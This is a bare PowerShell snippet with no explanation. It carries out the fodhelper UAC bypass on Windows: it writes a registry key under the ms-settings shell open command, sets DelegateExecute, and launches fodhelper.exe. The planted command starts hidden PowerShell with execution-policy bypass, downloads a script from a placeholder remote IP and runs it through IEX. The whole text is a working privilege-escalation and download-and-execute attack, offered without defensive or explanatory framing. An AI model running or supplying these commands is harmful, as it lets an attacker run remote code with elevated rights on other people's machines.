New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Value "powershell.exe -w hidden -ep bypass (New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/run_fodhelper_bypass_.ps1')|IEX" –force
New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
